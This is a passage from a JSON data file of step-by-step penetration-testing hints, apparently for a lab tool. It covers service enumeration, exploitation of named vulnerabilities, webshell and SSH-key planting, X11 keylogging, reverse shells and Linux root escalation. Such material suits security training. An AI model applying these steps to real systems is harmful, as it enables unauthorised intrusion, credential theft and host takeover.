        "If VRFY is disabled, run it again with -M RCPT."
      ],
      "look": [
        "Names returned as existing. Those are confirmed accounts."
      ],
      "win": "Valid usernames print as existing.",
      "mistakes": [
        "Treating a name as a credential. It is spray material.",
        "A huge wordlist is slow and noisy. A focused list is better."
      ]
    },
    {
      "when": "To drive one transaction and see how the server behaves.",
      "look": [
        "Whether the recipient is accepted, and whether an external recipient relays (a separate finding)."
      ],
      "win": "The full SMTP conversation prints, showing acceptance.",
      "mistakes": [
        "Only testing enumeration. Note relay behaviour while connected."
      ]
    }
  ],
  "recon-ftp": [
    {
      "when": "The first check when 21 is open.",
      "look": [
        "A [+] for anonymous access."
      ],
      "win": "nxc prints [+] for anonymous login.",
      "mistakes": [
        "Stopping at \"login works\". The value is what you can read or write."
      ]
    },
    {
      "when": "To list the root over anonymous FTP quickly.",
      "look": [
        "Config, backup, and source files. Those are loot.",
        "A directory you might be able to write to."
      ],
      "win": "The FTP root listing prints.",
      "mistakes": [
        "Treating a listing as a shell."
      ]
    },
    {
      "when": "To browse, download, and test write access by hand.",
      "land": [
        "Log in anonymous for both fields, then ls, get a file, and try a small put to test write access."
      ],
      "look": [
        "Whether put succeeds. A writable directory that maps to a web root is a foothold."
      ],
      "win": "You reach an ftp prompt and ls lists files.",
      "mistakes": [
        "Forgetting binary mode before downloading an archive or image."
      ]
    }
  ],
  "recon-mail": [
    {
      "when": "When 110, 143, 993, or 995 is open.",
      "look": [
        "The ntlm-info lines on an AD-joined server, which leak the domain and hostname.",
        "The server software and its capabilities."
      ],
      "win": "Capabilities, version, and on AD hosts the domain and host name print.",
      "mistakes": [
        "Reading capabilities as access. Reading mail needs a login."
      ]
    },
    {
      "when": "To read the mail banner and certificate directly.",
      "look": [
        "The certificate CN or SAN. It often names the real host to add to /etc/hosts."
      ],
      "win": "The certificate and banner print, naming the true host.",
      "mistakes": [
        "Forgetting -crlf, which can hang the session."
      ]
    },
    {
      "when": "Only once you hold a credential.",
      "look": [
        "The mailbox listing, and any further credentials or reset links inside messages."
      ],
      "win": "A mailbox listing prints, confirming the login.",
      "mistakes": [
        "Trying it with no credential. It needs a validated login first."
      ]
    }
  ],
  "rdp-enum": [
    {
      "when": "When 3389 is open and you want the host and domain name with no credential.",
      "look": [
        "The hostname and domain in the banner.",
        "Whether NLA is required, which decides what can reach it."
      ],
      "win": "The hostname, domain, and NLA mode print.",
      "mistakes": [
        "Expecting a desktop. This only reads the banner."
      ]
    },
    {
      "when": "Once you hold a username and password, to confirm RDP login.",
      "look": [
        "A [+] for the credential, and a (Pwn3d!) meaning admin over RDP."
      ],
      "win": "nxc prints [+] for the credential.",
      "mistakes": [
        "Reading [+] as a desktop. The session is taken next."
      ]
    },
    {
      "when": "When you hold an NT hash but no password.",
      "look": [
        "A [+] for the hash. This path needs Restricted Admin enabled on the target."
      ],
      "win": "nxc prints [+] for the hash.",
      "mistakes": [
        "Pasting the whole LM:NT hash. Use only the NT half."
      ]
    },
    {
      "when": "To grab a login or desktop image for your notes.",
      "look": [
        "The saved PNG path it prints."
      ],
      "win": "nxc saves a screenshot and prints its path.",
      "mistakes": [
        "Treating a login-screen image as proof of access."
      ]
    },
    {
      "when": "To open the real session with a validated credential.",
      "land": [
        "Keep +clipboard and /dynamic-resolution for a usable session. /cert:ignore accepts the self-signed cert."
      ],
      "win": "A full desktop opens, logged in as your user.",
      "mistakes": [
        "Dropping /cert:ignore and stalling on the certificate prompt."
      ]
    }
  ],
  "nfs-enum": [
    {
      "when": "When 2049 is open.",
      "look": [
        "The exported paths and which hosts can mount them.",
        "An export shared with an asterisk, meaning everyone."
      ],
      "win": "The exports and their allowed hosts print.",
      "mistakes": [
        "Treating an export listing as access. You still have to mount and read it."
      ]
    },
    {
      "when": "As a cross-check of the export list.",
      "look": [
        "An asterisk (world) or a broad CIDR.",
        "A missing root_squash option, which is a direct privilege-escalation lead."
      ],
      "win": "A list of export paths with their allowed hosts prints.",
      "mistakes": [
        "Missing the no_root_squash note on an export."
      ]
    },
    {
      "when": "To actually read an export.",
      "land": [
        "Make the mount point, then mount read-only with sudo. Replace the export token with a path from showmount."
      ],
      "look": [
        "Home directories (for SSH keys), configs, and backups once mounted."
      ],
      "win": "The export contents appear under /mnt/nfs.",
      "mistakes": [
        "Forgetting -o nolock on an older server, which can hang the mount."
      ]
    }
  ],
  "nfs-to-foothold": [
    {
      "when": "When an export is world-shared and you want a foothold, not just loot.",
      "look": [
        "An export open to all hosts (asterisk). That is the lead."
      ],
      "win": "A world-shared export shows in the list.",
      "mistakes": [
        "Stopping at a readable export. The foothold comes from a key you read or write."
      ]
    },
    {
      "when": "After mounting a home-directory export.",
      "setup": [
        {
          "label": "Generate a throwaway key pair on your box",
          "cmd": "ssh-keygen -q -N \"\" -f ./id_rsa && cp ./id_rsa.pub ./authorized_keys"
        }
      ],
      "land": [
        "Mount the export, then either read a private key to log in with, or match the owner UID locally and write your authorized_keys. Then connect over SSH and run id."
      ],
      "look": [
        "A private key in a .ssh directory, or a home you can write to."
      ],
      "win": "An SSH login lands a shell and id shows the expected user.",
      "mistakes": [
        "Writing authorized_keys from the wrong local UID. The server rejects the write."
      ]
    }
  ],
  "recon-telnet": [
    {
      "when": "When 23 is open.",
      "look": [
        "The banner naming the OS, device model, or hostname.",
        "On Windows telnet, the hostname and domain the ntlm-info script leaks."
      ],
      "win": "The banner prints, and on Windows the host and domain appear.",
      "mistakes": [
        "Ignoring the banner, which usually names what you are dealing with."
      ]
    },
    {
      "when": "To read the banner and try the obvious logins by hand.",
      "land": [
        "Connect, read the banner, and try the device defaults (admin with admin, or root with a blank or reused password)."
      ],
      "look": [
        "A login prompt, and whether a weak credential is accepted."
      ],
      "win": "A weak or default credential drops you to a shell.",
      "mistakes": [
        "Forgetting telnet is cleartext. Anything typed is on the wire."
      ]
    },
    {
      "when": "When the banner suggests a brute is worth it.",
      "look": [
        "A host line naming a valid login and password."
      ],
      "win": "A valid login and password pair prints.",
      "mistakes": [
        "Running a giant wordlist before the service looks promising."
      ]
    }
  ],
  "telnet-login": [
    {
      "when": "Once you hold a credential (a default, a spray hit, or a reused password).",
      "land": [
        "Log in, then run id, hostname, and ip -4 addr together so the shell and host identity land in one frame."
      ],
      "win": "A shell prompt appears and the identity commands print your user and the target IP.",
      "mistakes": [
        "Capturing the shell without the host identity in the same screenshot."
      ]
    },
    {
      "when": "When you have no credential yet. Telnet devices lean on weak logins.",
      "setup": [
        {
          "label": "Unpack the rockyou wordlist",
          "cmd": "gunzip -k /usr/share/wordlists/rockyou.txt.gz"
        }
      ],
      "look": [
        "A found login line, which is your way in."
      ],
      "win": "A valid login and password print, which log you into a shell.",
      "mistakes": [
        "Ignoring the rare device that locks accounts. Watch the responses."
      ]
    }
  ],
  "recon-rservices": [
    {
      "when": "When 512, 513, or 514 are open, on legacy Unix.",
      "look": [
        "Which of the three r-services answer. They often appear together."
      ],
      "win": "The scan confirms which r-service ports are open.",
      "mistakes": [
        "Skipping them as obscure. A trusting r-service is often a direct root login."
      ]
    },
    {
      "when": "To test a host-trust login as root.",
      "land": [
        "This needs the rsh-client package on your box, which provides rlogin and rsh."
      ],
      "look": [
        "A shell with no password prompt. That means a trust entry covers you."
      ],
      "win": "You land a shell with no password, allowed by the trust.",
      "mistakes": [
        "Reading a prompt as failure. Try each enumerated user too."
      ]
    },
    {
      "when": "To prove the trust with a single command.",
      "look": [
        "The root identity returned with no password."
      ],
      "win": "The command returns the root identity with no authentication.",
      "mistakes": [
        "Reading an error as patched. It usually means your host is not trusted yet."
      ]
    }
  ],
  "rservices-login": [
    {
      "when": "When recon showed the r-service ports and you want the foothold.",
      "land": [
        "Try root first, then each enumerated user. Run id and hostname to capture it."
      ],
      "look": [
        "A password-free shell as a user the trust covers."
      ],
      "win": "A shell opens with no password and id shows your user.",
      "mistakes": [
        "Skipping the per-user attempts. The trust may cover one account only."
      ]
    },
    {
      "when": "To confirm the trust quickly.",
      "look": [
        "The root identity returned with no password."
      ],
      "win": "The command returns the root identity.",
      "mistakes": [
        "Treating one command result as the whole foothold. Open an interactive login to work from."
      ]
    }
  ],
  "recon-rsync": [
    {
      "when": "When 873 is open.",
      "look": [
        "Module names. Each is a share you may be able to read or write."
      ],
      "win": "A list of module names prints.",
      "mistakes": [
        "Pulling a module before you know what it holds."
      ]
    },
    {
      "when": "Before pulling, to see what is inside a module.",
      "look": [
        "Source, backups, configs, and credential files."
      ],
      "win": "The files inside the chosen module print.",
      "mistakes": [
        "Downloading a huge module blindly."
      ]
    },
    {
      "when": "To take a module down for offline review.",
      "land": [
        "Pull it into your loot directory, then search the copy for secrets."
      ],
      "look": [
        "Passwords, keys, and configs in the pulled files."
      ],
      "win": "The module files land under your loot directory.",
      "mistakes": [
        "Reading the download as access. The foothold comes from what the files reveal."
      ]
    }
  ],
  "rsync-write-shell": [
    {
      "when": "When a module looks writable and maps onto a sensitive path.",
      "look": [
        "A module you can push a test file to."
      ],
      "win": "A module accepts a test upload.",
      "mistakes": [
        "Assuming every module is writable. Confirm with a throwaway file first."
      ]
    },
    {
      "when": "When the writable module maps onto a home directory.",
      "setup": [
        {
          "label": "Generate a throwaway key pair on your box",
          "cmd": "ssh-keygen -q -N \"\" -f ./id_rsa && cp ./id_rsa.pub ./authorized_keys"
        }
      ],
      "land": [
        "Push authorized_keys into the module .ssh path, then connect over SSH and run id."
      ],
      "win": "The upload succeeds and the SSH login lands a shell.",
      "mistakes": [
        "Writing to a module that is not actually a home. Match it to a real user path first."
      ]
    },
    {
      "when": "To confirm the planted-key login.",
      "land": [
        "Point the key file and user at what you just wrote."
      ],
      "win": "id prints over SSH, confirming the foothold.",
      "mistakes": [
        "Wrong key path or user. The login fails silently if either is off."
      ]
    }
  ],
  "recon-tftp": [
    {
      "when": "When a UDP scan shows 69 open, often on routers, phones, and PXE setups.",
      "look": [
        "Any well-known files the script could fetch."
      ],
      "win": "The script reports retrievable files.",
      "mistakes": [
        "Expecting a listing. TFTP cannot list. You fetch names you already know."
      ]
    },
    {
      "when": "To pull named device configs.",
      "land": [
        "Set binary mode, then get common config names like running-config or startup-config."
      ],
      "look": [
        "Hashes, SNMP community strings, and management passwords inside the config."
      ],
      "win": "A named file downloads.",
      "mistakes": [
        "Forgetting binary mode, which corrupts non-text files."
      ]
    }
  ],
  "tftp-write-shell": [
    {
      "when": "When the TFTP root is a writable, served directory.",
      "land": [
        "Upload a file whose language matches the site, then verify by requesting it in the next step."
      ],
      "win": "The follow-up request returns the file, proving the write landed somewhere served.",
      "mistakes": [
        "Assuming success from no error. TFTP is silent, so always verify."
      ]
    },
    {
      "when": "To confirm execution once the file is served.",
      "use": [
        "shell-listener",
        "shell-revshell-linux"
      ],
      "land": [
        "Request the uploaded file to run one command. Start your catcher first (the Shells lane sets one up) before a reverse shell."
      ],
      "win": "The command output returns in the HTTP response.",
      "mistakes": [
        "Jumping to a reverse shell before the one-command check proves execution."
      ]
    }
  ],
  "recon-x11": [
    {
      "when": "When 6000 and up is open.",
      "look": [
        "The script reporting that access control is disabled."
      ],
      "win": "The script confirms X11 access control is off.",
      "mistakes": [
        "Testing capture before confirming access is open."
      ]
    },
    {
      "when": "Once access control is off.",
      "setup": [
        {
          "label": "Install the X capture tools if missing (Loadout can do this too)",
          "cmd": "sudo apt install -y imagemagick x11-apps xdotool"
        }
      ],
      "land": [
        "Capture the desktop, then open screen.png."
      ],
      "look": [
        "Terminals, password managers, and chat windows with secrets on show."
      ],
      "win": "screen.png shows the current desktop.",
      "mistakes": [
        "Forgetting the convert step, leaving an unviewable xwd file."
      ]
    },
    {
      "when": "To confirm you can read the live session.",
      "look": [
        "The focused window name, confirming read access to the session."
      ],
      "win": "The focused window title prints.",
      "mistakes": [
        "Pointing DISPLAY at the wrong host or screen number."
      ]
    }
  ],
  "x11-keylog": [
    {
      "when": "When an open X11 display becomes a credential oracle.",
      "look": [
        "Secrets visible on screen right now."
      ],
      "win": "screen.png reveals on-screen content, sometimes a credential.",
      "mistakes": [
        "Reading an on-screen secret as proven access. It still has to be validated."
      ]
    },
    {
      "when": "To watch for a password being typed, including a sudo password.",
      "look": [
        "A password as the user enters it. Paste what you capture and obol records the candidate."
      ],
      "win": "Typed keystrokes stream out.",
      "mistakes": [
        "Treating a captured string as confirmed. It is a candidate until it logs in somewhere."
      ]
    }
  ],
  "ftp-upload-webshell": [
    {
      "when": "When FTP is writable and you suspect it maps to the web root.",
      "land": [
        "Write a marker file over FTP, then read it over HTTP. If it comes back, the directories overlap."
      ],
      "win": "The marker you wrote over FTP returns over HTTP.",
      "mistakes": [
        "Uploading a script before the marker proves the overlap."
      ]
    },
    {
      "when": "Once the overlap is proven.",
      "land": [
        "Upload a file whose language matches the site (php, aspx, jsp)."
      ],
      "win": "The upload returns no error.",
      "mistakes": [
        "Wrong language for the stack."
      ]
    },
    {
      "when": "To confirm execution.",
      "use": [
        "shell-listener",
        "shell-revshell-linux"
      ],
      "land": [
        "Request the uploaded file to run one command. Start your catcher first before a reverse shell."
      ],
      "win": "The command output returns in the response.",
      "mistakes": [
        "Skipping the one-command check before a reverse shell."
      ]
    }
  ],
  "ssh-user-enum": [
    {
      "when": "When 22 is open and you want to turn a blind brute into a targeted one.",
      "look": [
        "The OpenSSH version. Only releases before 7.7 leak usernames this way."
      ],
      "win": "nmap prints the OpenSSH version.",
      "mistakes": [
        "Running the enumeration on a patched server, which answers the same for every name."
      ]
    },
    {
      "when": "Against a pre-7.7 server.",
      "look": [
        "Each tested name marked found or not found."
      ],
      "win": "The module reports which names exist.",
      "mistakes": [
        "Reading a found name as a login. It is a validated username."
      ]
    },
    {
      "when": "After you have a validated user list.",
      "look": [
        "A host line naming a user and the password that worked."
      ],
      "win": "A working user and password print.",
      "mistakes": [
        "Spraying many passwords and tripping a lockout. One password across many users is safer."
      ]
    }
  ],
  "smtp-open-relay": [
    {
      "when": "When 25 is open and you want to test for a relay, a reportable finding.",
      "look": [
        "Whether any of the sixteen relay patterns were accepted."
      ],
      "win": "The script reports whether the server relayed its tests.",
      "mistakes": [
        "Confusing this with user enumeration. Relay is a separate finding."
      ]
    },
    {
      "when": "To prove the relay by hand.",
      "look": [
        "A 250 after an external recipient. That is the relay accepting."
      ],
      "win": "The server answers 250 to an external recipient.",
      "mistakes": [
        "Using an internal recipient, which a normal server accepts anyway."
      ]
    },
    {
      "when": "To drive the SMTP conversation step by step.",
      "look": [
        "A 250 on the recipient line."
      ],
      "win": "The recipient line returns 250.",
      "mistakes": [
        "Misreading a 550 as success. 250 is accept, 550 is refuse."
      ]
    }
  ],
  "ftp-bounce": [
    {
      "when": "When an old FTP server can reach a segment you cannot reach directly.",
      "land": [
        "Log in; anonymous is usually enough. You must be authenticated to issue PORT."
      ],
      "win": "You reach an ftp prompt.",
      "mistakes": [
        "Trying the bounce before logging in."
      ]
    },
    {
      "when": "To test whether the server honours an arbitrary data address.",
      "look": [
        "A 200 (bounce allowed) versus a 500 (blocked)."
      ],
      "win": "The server returns 200 for an internal address.",
      "mistakes": [
        "Reading 200 as a finding on its own. It is a pivot capability."
      ]
    },
    {
      "when": "To scan an internal host through the FTP server.",
      "look": [
        "Open ports on the internal host, scanned from the FTP server position."
      ],
      "win": "The scan prints the internal host open ports.",
      "mistakes": [
        "Expecting a shell. A bounce scan is reconnaissance."
      ]
    }
  ],
  "vsftpd-backdoor": [
    {
      "when": "When 21 is open, as a version check before anything else.",
      "look": [
        "The banner. This issue exists only when it reads exactly vsftpd 2.3.4."
      ],
      "win": "The FTP banner prints.",
      "mistakes": [
        "Trying the trigger on any other version."
      ]
    },
    {
      "when": "Only on a confirmed vsftpd 2.3.4.",
      "look": [
        "A shell on the second connection, to port 6200."
      ],
      "win": "The port 6200 connection returns a root shell and id shows uid 0.",
      "mistakes": [
        "Reporting the trigger before the 6200 shell answers."
      ]
    },
    {
      "when": "When the manual steps are awkward in your lab.",
      "win": "The module reports a session opened as root.",
      "mistakes": [
        "Skipping the version check first."
      ]
    }
  ],
  "proftpd-modcopy": [
    {
      "when": "When 21 is open.",
      "look": [
        "The banner reading ProFTPD 1.3.5."
      ],
      "win": "The ProFTPD version prints.",
      "mistakes": [
        "Attempting the copy on a patched version."
      ]
    },
    {
      "when": "Before writing anything, to prove the copy works.",
      "land": [
        "Copy a readable file to a temporary path first. You also need the web root, which HTTP recon reveals."
      ],
      "look": [
        "A success response to the copy commands."
      ],
      "win": "The copy commands return success.",
      "mistakes": [
        "Writing a payload before confirming the copy and the web root."
      ]
    },
    {
      "when": "After copying a file into the web root.",
      "use": [
        "shell-listener",
        "shell-revshell-linux"
      ],
      "land": [
        "Request it to run one command. Start your catcher first before a reverse shell."
      ],
      "win": "The command output returns in the response.",
      "mistakes": [
        "Guessing the web root. Confirm it from HTTP recon."
      ]
    }
  ],
  "samba-usermap": [
    {
      "when": "When 139 or 445 is open on an old Linux Samba.",
      "look": [
        "A version between 3.0.20 and 3.0.25rc3."
      ],
      "win": "nmap prints the Samba version.",
      "mistakes": [
        "Trying it outside that version range."
      ]
    },
    {
      "when": "On a confirmed vulnerable Samba.",
      "use": [
        "shell-listener"
      ],
      "land": [
        "Start your catcher first (the Shells lane sets one up) before you send it."
      ],
      "look": [
        "A connection arriving on your catcher."
      ],
      "win": "Your catcher receives a shell and id shows root.",
      "mistakes": [
        "Sending it with no catcher ready."
      ]
    },
    {
      "when": "When the manual step is awkward.",
      "win": "The module reports a root session.",
      "mistakes": [
        "Skipping the version check."
      ]
    }
  ],
  "smbghost": [
    {
      "when": "When 445 is open on Windows 10 1903 or 1909, or Server 2019.",
      "look": [
        "SMB 3.1.1 offered, on one of the affected builds."
      ],
      "win": "nmap confirms SMB 3.1.1.",
      "mistakes": [
        "Assuming any SMBv3 is affected."
      ]
    },
    {
      "when": "Right after confirming SMB 3.1.1, to check CVE-2020-0796 safely with NetExec.",
      "land": [
        "NetExec's smbghost module checks SMBv3.1.1 compression negotiation without sending a crash-inducing payload."
      ],
      "look": [
        "VULNERABLE to SMBGhost (CVE-2020-0796) in the module output."
      ],
      "win": "NetExec confirms the host is vulnerable to SMBGhost.",
      "mistakes": [
        "Jumping straight to the RCE PoC before verifying compression is enabled."
      ]
    },
    {
      "when": "Before risking the exploit.",
      "look": [
        "A clear Vulnerable or Not vulnerable verdict."
      ],
      "win": "The scanner prints Vulnerable.",
      "mistakes": [
        "Firing blind without the scanner."
      ]
    },
    {
      "when": "Only in a lab you can reset, on a confirmed-vulnerable host.",
      "land": [
        "Snapshot the box first. Point the callback at your attacker IP."
      ],
      "look": [
        "A SYSTEM shell on a box that stayed up."
      ],
      "win": "The exploit returns a SYSTEM shell.",
      "mistakes": [
        "Running it against a box you cannot reset. A failed attempt often crashes the host."
      ]
    }
  ],
  "bluekeep": [
    {
      "when": "When 3389 is open on Windows 7 or Server 2008 R2.",
      "look": [
        "A VULNERABLE verdict from the script."
      ],
      "win": "The script reports VULNERABLE.",
      "mistakes": [
        "Firing without the confirmation. This is very crash-prone."
      ]
    },
    {
      "when": "Only in a lab you can reset.",
      "land": [
        "Set the correct target architecture and VM profile, and snapshot first. The wrong profile crashes the host."
      ],
      "win": "The module returns a SYSTEM session on a box that stayed up.",
      "mistakes": [
        "Leaving the default target profile."
      ]
    }
  ],
  "freeswitch-esl": [
    {
      "when": "When 8021 is open, on a VoIP server.",
      "look": [
        "A status reply, meaning the default password is accepted."
      ],
      "win": "The socket returns a status block.",
      "mistakes": [
        "Assuming it is harmless. The socket runs commands."
      ]
    },
    {
      "when": "To confirm command execution and the context.",
      "look": [
        "The account name, often a high-privilege service account on Windows."
      ],
      "win": "whoami returns an account name.",
      "mistakes": [
        "Skipping the context check."
      ]
    },
    {
      "when": "To get an interactive shell.",
      "use": [
        "shell-listener"
      ],
      "land": [
        "Start your catcher first, then run it."
      ],
      "win": "Your catcher receives a shell in the service context.",
      "mistakes": [
        "Running it with no catcher ready."
      ]
    }
  ],
  "jdwp-debug": [
    {
      "when": "When a Java debug port is reachable, often only through a pivot.",
      "look": [
        "An echoed handshake, confirming a live debugger."
      ],
      "win": "The port echoes the handshake.",
      "mistakes": [
        "Expecting a remote port. It is often local-only."
      ]
    },
    {
      "when": "To get the helper that talks to the debugger.",
      "land": [
        "It needs python2."
      ],
      "win": "The tool is cloned.",
      "mistakes": [
        "Running it under python3."
      ]
    },
    {
      "when": "To execute as the JVM user.",
      "use": [
        "shell-listener"
      ],
      "land": [
        "If the port is local-only, reach it through a ligolo or chisel pivot. Start your catcher first."
      ],
      "win": "Your catcher receives a shell in the JVM user context.",
      "mistakes": [
        "Pointing it at the public IP when the port only listens locally."
      ]
    }
  ],
  "aerospike-udf": [
    {
      "when": "When 3000 to 3003 is open, often named as a web app backend.",
      "look": [
        "An Aerospike info banner."
      ],
      "win": "The port returns an Aerospike banner.",
      "mistakes": [
        "Overlooking it as just a database port."
      ]
    },
    {
      "when": "To get the helper.",
      "win": "The helper is cloned.",
      "mistakes": [
        "Skipping the version check. Only up to 5.1.0.6 is affected."
      ]
    },
    {
      "when": "To execute as the aerospike user.",
      "use": [
        "shell-listener"
      ],
      "land": [
        "Start your catcher first, then run it."
      ],
      "win": "Your catcher receives a shell as the aerospike user.",
      "mistakes": [
        "Running with no catcher ready."
      ]
    }
  ],
  "wifi-mouse-rce": [
    {
      "when": "When 1978 is open.",
      "look": [
        "The control port answering."
      ],
      "win": "Port 1978 answers.",
      "mistakes": [
        "Assuming the port is harmless."
      ]
    },
    {
      "when": "To run code as the desktop user.",
      "use": [
        "shell-listener"
      ],
      "land": [
        "Start your catcher first."
      ],
      "win": "Your catcher receives a shell in the desktop user context.",
      "mistakes": [
        "Running it with no catcher ready."
      ]
    }
  ],
  "nmap-host-unresponsive": [
    {
      "when": "The moment a scan says \"host seems down\" on a box you believe is up.",
      "land": [
        "-Pn treats the host as up and skips the ping. This is the fix most of the time."
      ],
      "win": "Ports start reporting open or closed, so the host is clearly alive.",
      "mistakes": [
        "Giving up on a \"down\" host before trying -Pn."
      ]
    },
    {
      "when": "When TCP looks bare but the box clearly does something.",
      "look": [
        "A UDP service (SNMP, TFTP, IKE, DNS) the TCP scan missed."
      ],
      "win": "A UDP service appears.",
      "mistakes": [
        "Concluding a box is empty after a TCP-only scan."
      ]
    },
    {
      "when": "When SYN scans come back filtered.",
      "land": [
        "A full-connect scan, or a trusted source port like 53, can slip past a stateless firewall."
      ],
      "win": "Filtered ports now report their real state.",
      "mistakes": [
        "Assuming filtered means closed."
      ]
    }
  ],
  "fix-name-resolution": [
    {
      "when": "The moment a tool says it cannot resolve a name.",
      "land": [
        "Map the IP to the name(s) the app or DC uses. Read the names from TLS certs, redirects, LDAP, or SMB. Then re-run what failed."
      ],
      "win": "The command that failed now runs.",
      "mistakes": [
        "Using the IP where the app or Kerberos needs the name."
      ]
    },
    {
      "when": "When a name resolves but the site shows a default page.",
      "look": [
        "A different response when you send the right Host header, which means virtual-host routing."
      ],
      "win": "The response changes with the right Host header.",
      "mistakes": [
        "Testing only the IP. The real site may answer only to the right name."
      ]
    }
  ],
  "linux-enum": [
    {
      "land": [
        "Serve the scanner from your box (the recipe below), and tee its output to a file so you keep the evidence."
      ],
      "look": [
        "One outlier, not the whole wall: a SUID binary that is not standard, a NOPASSWD sudo rule, a writable file that root runs, a cron job in a path you control.",
        "The lines linpeas highlights in red or yellow, which it rates most likely.",
        "The kernel version and distribution, in case you fall back to a kernel exploit later."
      ],
      "win": "A long report prints; the highlighted leads are your shortlist.",
      "mistakes": [
        "Drowning in the output. Hunt for the one thing that is wrong, not every coloured line.",
        "Running it and not reading it. The scanner finds leads; you still pick the one that fits."
      ]
    },
    {
      "look": [
        "A NOPASSWD line in sudo -l, which is often an instant win.",
        "Your groups in id: lxd, docker, adm, and disk each have their own escape.",
        "Other real users with a login shell, as accounts to move to next."
      ],
      "win": "Your sudo rights, your groups, and the other users print in three lines.",
      "mistakes": [
        "Skipping sudo -l because it may ask for a password. Even a password-required rule is a path once you hold the password."
      ]
    },
    {
      "look": [
        "A SUID binary outside the standard set (not su, sudo, mount, passwd).",
        "A capability on an interpreter such as python or perl.",
        "A cron entry, or a writable cron directory."
      ],
      "win": "The three highest-value checks print in one shot.",
      "mistakes": [
        "Treating every SUID file as a lead. The stock ones are noise; the outlier is the lead."
      ]
    },
    {
      "when": "From Kali over SSH when you want a one-shot non-interactive triage before opening a full shell.",
      "land": [
        "Runs id, uname -a, sudo -n -l, SUID search, and getcap remotely over SSH via NetExec."
      ],
      "look": [
        "NOPASSWD sudo rules, non-standard SUID binaries, or file capabilities on interpreters."
      ],
      "win": "Identity, kernel version, passwordless sudo rules, SUID binaries, and capabilities print remotely.",
      "mistakes": [
        "Expecting sudo -n -l to list rules that require a password; open an interactive SSH session if sudo prompts."
      ]
    }
  ],
  "sudo-abuse": [
    {
      "look": [
        "A rule letting you run a specific binary as root, especially with NOPASSWD. Look each binary up on gtfobins.github.io.",
        "ALL : ALL, which with your own password is root directly."
      ],
      "win": "sudo -l lists exactly what you may run as root.",
      "mistakes": [
        "Not checking GTFOBins for every listed binary. Many ordinary tools have a documented root escape."
      ]
    },
    {
      "land": [
        "This is the general shape only. GTFOBins gives the exact escape for your binary; copy that line, not this one."
      ],
      "win": "You drop into a root shell and id shows uid=0.",
      "mistakes": [
        "Using this generic form verbatim. The precise command differs per binary."
      ]
    },
    {
      "when": "When sudo -l allows systemctl status, journalctl, or another command that spawns less as its pager.",
      "land": [
        "Run the command in an interactive terminal wide/short enough to trigger the pager, then type !sh and press Enter."
      ],
      "look": [
        "The less pager prompt (:), where typing !sh spawns a root shell."
      ],
      "win": "Typing !sh inside the pager drops you into a root shell.",
      "mistakes": [
        "Passing --no-pager or running in a non-interactive shell where systemd skips invoking less."
      ]
    }
  ],
  "writable-passwd": [
    {
      "look": [
        "A w for group or other on /etc/passwd (for example -rw-rw-rw-). That is the green light."
      ],
      "win": "The permissions show the account file is writable.",
      "mistakes": [
        "Assuming it is writable. Confirm the w bit first; usually it is not."
      ]
    },
    {
      "land": [
        "Run this on YOUR Kali box to make a password hash. You will paste the hash into the new account line next."
      ],
      "win": "openssl prints a hash string to paste.",
      "mistakes": [
        "Running it on the target. Generate the hash on your box and carry only the hash over."
      ]
    },
    {
      "land": [
        "On the TARGET, add the line with your hash in place of HASH_FROM_OPENSSL, then run: su r00t, with the password you chose."
      ],
      "win": "su r00t gives a root shell.",
      "mistakes": [
        "Leaving HASH_FROM_OPENSSL in the line literally. Swap in the hash you generated."
      ]
    }
  ],
  "nfs-squash": [
    {
      "look": [
        "no_root_squash in the export options. Read /etc/exports from the foothold if showmount does not show it."
      ],
      "win": "An export marked no_root_squash shows.",
      "mistakes": [
        "Missing the option. Without no_root_squash the server maps your root to nobody and this fails."
      ]
    },
    {
      "land": [
        "Run this on YOUR Kali box, as root: mount the export, copy a bash onto it, and set the SUID bit. The server preserves it because of no_root_squash."
      ],
      "win": "A SUID root bash now sits on the share.",
      "mistakes": [
        "Doing this on the target. The weapon is built on your box, where you are root; it is fired on the target."
      ]
    },
    {
      "land": [
        "Back on the TARGET, run the SUID bash with -p so it keeps its root."
      ],
      "win": "id shows euid=0; you are root on the target.",
      "mistakes": [
        "Forgetting -p. Without it bash drops the root it inherited."
      ]
    }
  ],
  "lxc-lxd-escape": [
    {
      "look": [
        "lxd or lxc in your group list. If it is there, this is over with no exploit fired."
      ],
      "win": "id shows you are in the lxd or lxc group.",
      "mistakes": [
        "Skipping id. Group membership decides the whole move, so check it first."
      ]
    },
    {
      "land": [
        "Reuse an image already present. If none, build a tiny alpine image on your box and import it (the note names the steps)."
      ],
      "win": "An image is available to launch.",
      "mistakes": [
        "Pulling over the network on an isolated box. Reuse a present image, or import one you built."
      ]
    },
    {
      "land": [
        "The security.privileged flag is the whole point: root inside this container is root on the host."
      ],
      "win": "The container is created privileged.",
      "mistakes": [
        "Omitting security.privileged=true, which leaves you contained."
      ]
    },
    {
      "land": [
        "Bind the whole host disk into the container at /mnt/root."
      ],
      "win": "The host filesystem is mapped into the container.",
      "mistakes": [
        "A wrong source or path; source=/ with recursive=true maps everything."
      ]
    },
    {
      "land": [
        "Start it and get a shell. /mnt/root is the host filesystem, writable as root."
      ],
      "win": "Inside, /mnt/root holds the host files; read the root flag or edit /mnt/root/etc.",
      "mistakes": [
        "Looking for root inside the container only. The prize is /mnt/root, the real host."
      ]
    }
  ],
  "docker-socket": [
    {
      "look": [
        "The docker group in id, or a docker.sock you can write to. Either one is game over."
      ],
      "win": "You are in the docker group, or the socket is writable.",
      "mistakes": [
        "Assuming you need the docker command; a writable socket alone is enough with curl."
      ]
    },
    {
      "land": [
        "Pick any image already present to avoid pulling over the network."
      ],
      "win": "An image name you can use is listed.",
      "mistakes": [
        "Pulling a fresh image on an offline box."
      ]
    },
    {
      "land": [
        "Mount the host root into the container and chroot into it. You are root on the host filesystem."
      ],
      "win": "At /mnt (the host) you can read the root flag and edit host files.",
      "mistakes": [
        "Forgetting -v /:/mnt; without the bind-mount you only get the container."
      ]
    }
  ],
  "suid-gtfobins": [
    {
      "look": [
        "A SUID binary that is NOT in the usual set (su, sudo, mount, passwd, ping). The outlier is the lead.",
        "A custom or unusual binary; look it up on gtfobins.github.io."
      ],
      "win": "A list of SUID binaries prints; the non-standard one is your target.",
      "mistakes": [
        "Treating the stock SUID files as leads. They are expected; hunt the outlier."
      ]
    },
    {
      "look": [
        "SGID on a notable group: adm lets you read /var/log, shadow lets you crack the root hash.",
        "The owner of each binary, since it runs as its owner."
      ],
      "win": "SUID and SGID files print with owner and group.",
      "mistakes": [
        "Ignoring SGID. A group bit on the right group is its own path."
      ]
    },
    {
      "when": "A non-standard SUID binary path has been identified.",
      "land": [
